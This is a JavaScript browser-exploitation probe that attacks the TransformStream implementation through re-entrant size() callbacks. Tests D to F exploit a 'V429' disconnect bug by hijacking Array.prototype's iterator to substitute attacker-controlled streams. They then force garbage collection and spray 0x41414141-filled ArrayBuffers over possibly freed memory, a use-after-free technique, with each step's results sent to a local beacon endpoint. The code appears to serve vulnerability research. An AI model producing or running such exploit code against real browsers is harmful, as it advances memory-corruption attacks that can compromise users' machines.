/*
 * p430 -- Two hot angles:
 *   A-C: size() re-entrancy during controller.enqueue() (Opus55 Angle 1)
 *   D-F: V429 disconnect exploitation (error/close the disconnected pipeline)
 *   G:   Transformer getter ordering (construction-time re-entrancy data)
 *
 * Beacon prefix: V430-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V430-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

// ================================================================
// Test A: size() re-entrancy -- error controller during enqueue
// ================================================================

function testA() {
  B("A-START");
  var sizeCallCount = 0;
  var errorInSize = false;
  var enqueueResults = [];
  var savedCtrl = null;

  try {
    var ts = new TransformStream({
      start: function(controller) {
        savedCtrl = controller;
      },
      transform: function(chunk, controller) {
        try {
          controller.enqueue(chunk);
          enqueueResults.push("ok");
        } catch(e) {
          enqueueResults.push("threw:" + e.message.slice(0, 40));
        }
      }
    }, undefined, {
      highWaterMark: 16,
      size: function(chunk) {
        sizeCallCount++;
        B("A-SIZE-" + sizeCallCount, {chunk: String(chunk).slice(0, 20)});

        if (sizeCallCount === 1 && savedCtrl) {
          try {
            savedCtrl.error(new Error("mid-enqueue-error"));
            errorInSize = true;
            B("A-SIZE-ERROR-OK");
          } catch(e) {
            B("A-SIZE-ERROR-THREW", e.message.slice(0, 60));
            errorInSize = "threw:" + e.message.slice(0, 40);
          }
        }
        return 1;
      }
    });

    var writer = ts.writable.getWriter();
    var reader = ts.readable.getReader();

    writer.write("chunk-1").then(function() {
      B("A-WRITE1-OK");
    }).catch(function(e) {
      B("A-WRITE1-ERR", e.message.slice(0, 60));
    });

    reader.read().then(function(res) {
      B("A-READ", {done: res.done, val: typeof res.value, valStr: String(res.value).slice(0, 40)});
    }).catch(function(e) {
      B("A-READ-ERR", e.message.slice(0, 60));
    });

    setTimeout(function() {
      B("A-RESULT", {
        sizeCalls: sizeCallCount,
        errorInSize: errorInSize,
        enqueues: enqueueResults
      });
    }, 500);
  } catch(e) {
    B("A-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test B: size() re-entrancy -- cancel readable during enqueue
// ================================================================

function testB() {
  B("B-START");
  var sizeCallCount = 0;
  var readerRef = null;
  var cancelDone = false;

  try {
    var ts = new TransformStream({
      transform: function(chunk, controller) {
        try {
          controller.enqueue(chunk);
          B("B-ENQUEUE-OK");
        } catch(e) {
          B("B-ENQUEUE-THREW", e.message.slice(0, 60));
        }
      }
    }, undefined, {
      highWaterMark: 16,
      size: function(chunk) {
        sizeCallCount++;
        if (sizeCallCount === 1 && readerRef) {
          try {
            readerRef.cancel("size-cancel");
            cancelDone = true;
            B("B-SIZE-CANCEL-OK");
          } catch(e) {
            B("B-SIZE-CANCEL-THREW", e.message.slice(0, 60));
          }
        }
        return 1;
      }
    });

    readerRef = ts.readable.getReader();
    var writer = ts.writable.getWriter();

    writer.write("data-1").catch(function(e) {
      B("B-WRITE-ERR", e.message.slice(0, 60));
    });

    readerRef.read().then(function(res) {
      B("B-READ", {done: res.done, val: typeof res.value});
    }).catch(function(e) {
      B("B-READ-ERR", e.message.slice(0, 60));
    });

    setTimeout(function() {
      B("B-RESULT", {sizeCalls: sizeCallCount, cancelDone: cancelDone});
    }, 500);
  } catch(e) {
    B("B-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test C: size() re-entrancy -- close controller during enqueue
// ================================================================

function testC() {
  B("C-START");
  var sizeCallCount = 0;
  var savedCtrl = null;
  var closeDone = false;

  try {
    var ts = new TransformStream({
      start: function(controller) {
        savedCtrl = controller;
      },
      transform: function(chunk, controller) {
        try {
          controller.enqueue(chunk);
          B("C-ENQUEUE-OK");
        } catch(e) {
          B("C-ENQUEUE-THREW", e.message.slice(0, 60));
        }
      }
    }, undefined, {
      highWaterMark: 16,
      size: function(chunk) {
        sizeCallCount++;
        if (sizeCallCount === 1 && savedCtrl) {
          try {
            savedCtrl.terminate();
            closeDone = "terminate";
            B("C-SIZE-TERMINATE-OK");
          } catch(e) {
            // terminate might not exist, try desiredSize
            try {
              savedCtrl.error(new TypeError("close-attack"));
              closeDone = "error";
              B("C-SIZE-ERROR-OK");
            } catch(e2) {
              B("C-SIZE-CLOSE-THREW", e2.message.slice(0, 60));
            }
          }
        }
        return 1;
      }
    });

    var writer = ts.writable.getWriter();
    var reader = ts.readable.getReader();

    writer.write("data").catch(function(e) {
      B("C-WRITE-ERR", e.message.slice(0, 60));
    });

    reader.read().then(function(res) {
      B("C-READ", {done: res.done, val: String(res.value).slice(0, 30)});
    }).catch(function(e) {
      B("C-READ-ERR", e.message.slice(0, 60));
    });

    setTimeout(function() {
      B("C-RESULT", {sizeCalls: sizeCallCount, closeDone: closeDone});
    }, 500);
  } catch(e) {
    B("C-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test D: V429 disconnect -- error attacker writable, write to real
// ================================================================

function testD() {
  B("D-START");

  var origIter = Array.prototype[Symbol.iterator];
  var iterCallCount = 0;
  var realReadable = null;
  var realWritable = null;

  try {
    var attackerReadable = new ReadableStream({
      start: function(ctrl) { /* idle */ }
    });
    var attackerWritable = new WritableStream({
      write: function() { return Promise.resolve(); }
    });

    Array.prototype[Symbol.iterator] = function() {
      iterCallCount++;
      var callNum = iterCallCount;
      var arr = this;
      var idx = 0;

      if (callNum === 1) {
        return {
          next: function() {
            if (idx < arr.length) {
              var val = arr[idx];
              if (idx === 0) realReadable = val;
              if (idx === 1) realWritable = val;
              idx++;
              return {value: val, done: false};
            }
            return {done: true};
          }
        };
      }
      if (callNum === 2) {
        return {
          next: function() {
            if (idx < arr.length) {
              var val = arr[idx];
              if (idx === 1) val = attackerReadable;
              if (idx === 2) val = attackerWritable;
              idx++;
              return {value: val, done: false};
            }
            return {done: true};
          }
        };
      }
      return origIter.call(arr);
    };

    var ts = new TransformStream({
      transform: function(chunk, controller) {
        controller.enqueue(chunk);
      }
    });

    Array.prototype[Symbol.iterator] = origIter;

    // Now: error the attacker writable (which ts THINKS is its writable)
    var atkWriter = ts.writable.getWriter();
    atkWriter.abort("forced-error").then(function() {
      B("D-ATK-ABORT-OK");
    }).catch(function(e) {
      B("D-ATK-ABORT-ERR", e.message.slice(0, 60));
    });

    // Try writing to the REAL writable (still alive, disconnected)
    setTimeout(function() {
      try {
        var realWriter = realWritable.getWriter();
        realWriter.write("after-atk-abort").then(function() {
          B("D-REAL-WRITE-OK");
          // Read from real readable
          var realReader = realReadable.getReader();
          realReader.read().then(function(res) {
            B("D-REAL-READ", {done: res.done, val: String(res.value).slice(0, 30)});
          }).catch(function(e) {
            B("D-REAL-READ-ERR", e.message.slice(0, 60));
          });
        }).catch(function(e) {
          B("D-REAL-WRITE-ERR", e.message.slice(0, 60));
        });
      } catch(e) {
        B("D-REAL-WRITE-EXCEPT", e.message.slice(0, 60));
      }
    }, 300);
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    B("D-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test E: V429 disconnect -- double-error (both sides)
// ================================================================

function testE() {
  B("E-START");

  var origIter = Array.prototype[Symbol.iterator];
  var iterCallCount = 0;
  var realReadable = null;
  var realWritable = null;

  try {
    var attackerReadable = new ReadableStream();
    var attackerWritable = new WritableStream();

    Array.prototype[Symbol.iterator] = function() {
      iterCallCount++;
      var callNum = iterCallCount;
      var arr = this;
      var idx = 0;

      if (callNum === 1) {
        return {
          next: function() {
            if (idx < arr.length) {
              var val = arr[idx];
              if (idx === 0) realReadable = val;
              if (idx === 1) realWritable = val;
              idx++;
              return {value: val, done: false};
            }
            return {done: true};
          }
        };
      }
      if (callNum === 2) {
        return {
          next: function() {
            if (idx < arr.length) {
              var val = arr[idx];
              if (idx === 1) val = attackerReadable;
              if (idx === 2) val = attackerWritable;
              idx++;
              return {value: val, done: false};
            }
            return {done: true};
          }
        };
      }
      return origIter.call(arr);
    };

    var ts = new TransformStream();
    Array.prototype[Symbol.iterator] = origIter;

    // Error BOTH sides simultaneously
    // Attacker side (what C++ thinks)
    var atkWriter = ts.writable.getWriter();
    atkWriter.abort("atk-error");

    // Real side (what JS builtins think)
    var realWriter = realWritable.getWriter();
    realWriter.abort("real-error");

    setTimeout(function() {
      // Check state of ts
      try {
        B("E-TS-READABLE-LOCKED", ts.readable.locked);
      } catch(e) {
        B("E-TS-READABLE-ERR", e.message.slice(0, 60));
      }

      // Try to create NEW reader/writer on the streams
      try {
        var r = ts.readable.getReader();
        r.read().then(function(res) {
          B("E-READ-RESULT", {done: res.done});
        }).catch(function(e) {
          B("E-READ-RESULT-ERR", e.message.slice(0, 60));
        });
      } catch(e) {
        B("E-NEW-READER-ERR", e.message.slice(0, 60));
      }

      // GC pressure then check for crash
      for (var i = 0; i < 50; i++) {
        var tmp = new ArrayBuffer(1024 * 1024);
      }
      B("E-SURVIVED-GC");
    }, 500);
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    B("E-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test F: V429 disconnect -- GC the orphaned streams
// ================================================================

function testF() {
  B("F-START");

  var origIter = Array.prototype[Symbol.iterator];
  var iterCallCount = 0;
  var realReadableRef = null;
  var realWritableRef = null;

  try {
    if (typeof WeakRef === "undefined") { B("F-NO-WEAKREF"); return; }

    var attackerReadable = new ReadableStream();
    var attackerWritable = new WritableStream();

    Array.prototype[Symbol.iterator] = function() {
      iterCallCount++;
      var callNum = iterCallCount;
      var arr = this;
      var idx = 0;

      if (callNum === 1) {
        return {
          next: function() {
            if (idx < arr.length) {
              var val = arr[idx];
              if (idx === 0) realReadableRef = new WeakRef(val);
              if (idx === 1) realWritableRef = new WeakRef(val);
              idx++;
              return {value: val, done: false};
            }
            return {done: true};
          }
        };
      }
      if (callNum === 2) {
        return {
          next: function() {
            if (idx < arr.length) {
              var val = arr[idx];
              if (idx === 1) val = attackerReadable;
              if (idx === 2) val = attackerWritable;
              idx++;
              return {value: val, done: false};
            }
            return {done: true};
          }
        };
      }
      return origIter.call(arr);
    };

    var ts = new TransformStream();
    Array.prototype[Symbol.iterator] = origIter;

    // Don't keep strong refs to real streams -- only WeakRefs
    // The only strong refs are in the TransformStream's JS private slots
    // (if C++ stored attacker streams, private slots might still have reals)

    // GC pressure
    for (var i = 0; i < 200; i++) {
      var tmp = new ArrayBuffer(512 * 1024);
    }

    var realRAlive = realReadableRef.deref() !== undefined;
    var realWAlive = realWritableRef.deref() !== undefined;
    B("F-AFTER-GC", {realR: realRAlive, realW: realWAlive});

    // More aggressive GC
    for (var i = 0; i < 200; i++) {
      var tmp = new ArrayBuffer(1024 * 1024);
    }

    var realRAlive2 = realReadableRef.deref() !== undefined;
    var realWAlive2 = realWritableRef.deref() !== undefined;
    B("F-AFTER-GC2", {realR: realRAlive2, realW: realWAlive2});

    // If reals are DEAD, spray ArrayBuffers over freed memory
    if (!realRAlive2 || !realWAlive2) {
      B("F-SPRAY-START");
      var spray = [];
      for (var i = 0; i < 5000; i++) {
        var ab = new ArrayBuffer(64);
        new Uint32Array(ab).fill(0x41414141);
        spray.push(ab);
      }
      B("F-SPRAY-DONE", spray.length);

      // Now access ts -- if it tries to use the freed real streams, crash or confusion
      try {
        B("F-TS-READABLE-TYPE", typeof ts.readable);
        B("F-TS-WRITABLE-TYPE", typeof ts.writable);
      } catch(e) {
        B("F-TS-ACCESS-CRASH", e.message.slice(0, 60));
      }
    }
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    B("F-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test G: Transformer getter ordering (construction phase timing)
// ================================================================

function testG() {
  B("G-START");

  var order = [];
  var transformer = {};

  var props = ["readableType", "writableType", "start", "transform", "flush"];
  props.forEach(function(prop) {
    Object.defineProperty(transformer, prop, {
      get: function() {
        order.push(prop);
        if (prop === "start") return function(ctrl) { order.push("start-called"); };
        if (prop === "transform") return function(chunk, ctrl) { ctrl.enqueue(chunk); };
        if (prop === "flush") return function(ctrl) { ctrl.close(); };
        return undefined;
      },
      configurable: true,
      enumerable: true
    });
  });

  try {
    var ts = new TransformStream(transformer);
    B("G-ORDER", order.join(","));
  } catch(e) {
    B("G-ERR", {order: order.join(","), msg: e.message.slice(0, 60)});
  }
}

testA();
testB();
testC();
setTimeout(function() { testD(); }, 600);
setTimeout(function() { testE(); }, 1200);
setTimeout(function() { testF(); }, 1800);
setTimeout(function() { testG(); }, 2400);
setTimeout(function() { B("DONE"); }, 3500);
})();
